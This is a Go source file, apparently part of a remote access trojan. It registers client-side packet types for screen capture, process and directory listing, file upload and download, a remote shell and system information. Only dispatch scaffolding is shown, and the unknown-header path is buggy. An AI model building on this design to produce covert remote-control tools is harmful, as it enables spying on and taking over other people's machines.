package main

import (
	"fmt"
	"rat/shared/network/header"
	"reflect"
)

type PacketMap map[header.PacketHeader]reflect.Type

var packets PacketMap

type OutgoingPacket interface {
	Header() header.PacketHeader
	Init(c *Client)
}

type IncomingPacket interface {
	OnReceive(c *Client) error
	Decode(buf []byte) (IncomingPacket, error)
}

type Packet struct{}

func init() {
	packets = make(PacketMap)
	packets[header.PingHeader] = reflect.TypeOf(Ping{})
	packets[header.ComputerInfoHeader] = reflect.TypeOf(ComputerInfoPacket{})
	packets[header.ScreenHeader] = reflect.TypeOf(ScreenPacket{})
	packets[header.ProcessHeader] = reflect.TypeOf(ProcessPacket{})
	packets[header.DirectoryHeader] = reflect.TypeOf(DirectoryPacket{})
	packets[header.UploadToClientHeader] = reflect.TypeOf(UploadPacket{})
	packets[header.DownloadToServerHeader] = reflect.TypeOf(DownloadPacket{})
	packets[header.ShellHeader] = reflect.TypeOf(ShellPacket{})
	packets[header.WindowsHeader] = reflect.TypeOf(WindowsPacket{})
}

func GetIncomingPacket(header header.PacketHeader) IncomingPacket {
	val := packets[header]
	if val == nil {
		fmt.Println("invalid header", header)
	}
	return reflect.New(val).Elem().Interface().(IncomingPacket)
}
